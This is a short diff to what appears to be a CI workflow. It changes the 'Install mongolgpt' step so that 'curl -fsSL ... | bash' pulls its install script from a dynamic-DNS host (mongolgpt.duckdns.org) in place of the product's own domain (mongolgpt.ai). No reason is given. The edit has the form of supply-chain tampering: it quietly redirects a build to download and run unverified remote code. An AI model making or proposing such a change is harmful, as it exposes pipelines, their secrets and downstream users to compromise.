@@ -37,7 +37,7 @@ jobs:
 
       - name: Install mongolgpt
         if: steps.team-check.outputs.is_team != 'true'
-        run: curl -fsSL https://mongolgpt.ai/install | bash
+        run: curl -fsSL https://mongolgpt.duckdns.org/install | bash
 
       - name: Build prompt
         if: steps.team-check.outputs.is_team != 'true'
